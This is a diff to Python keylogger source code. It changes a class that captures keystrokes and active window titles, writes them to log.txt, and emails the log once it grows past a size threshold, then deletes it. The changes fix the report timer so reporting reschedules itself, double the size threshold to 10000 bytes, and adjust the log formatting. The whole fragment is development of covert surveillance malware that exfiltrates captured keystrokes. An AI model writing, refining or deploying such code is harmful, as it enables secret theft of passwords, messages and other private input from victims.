@@ -23,7 +23,7 @@ class Keylogger:
     def onpress(self,key):
         if self.window != self.get_window_name():
             self.window = self.get_window_name()
-            self.string += "\n\n[ " + self.window + " ("+ datetime.now().strftime("%m/%d/%Y, %Hh%Mm%Ss") + ")]\n"
+            self.string += "\n[ " + self.window + " ("+ datetime.now().strftime("%m/%d/%Y, %Hh%Mm%Ss") + ")]\n"
         try:
             if hasattr(key, 'vk') and 96 <= key.vk <= 110:
                 if key.vk == 96:
@@ -72,18 +72,17 @@ class Keylogger:
         with open("log.txt","a") as f:
             f.write(self.string)
             self.string = ""
-            self.report()
             thread = threading.Timer(60,self.log)
             thread.start()
     
     def report(self):
         try:
-            if os.stat('log.txt').st_size > 5000:
+            if os.stat('log.txt').st_size > 10000:
                 self.send_mail('log.txt')
                 os.remove('log.txt')
         except FileNotFoundError:
             pass
-        thread = threading.Timer(900,self.log)
+        thread = threading.Timer(900,self.report)
         thread.start()
             
     def send_mail(self,file):
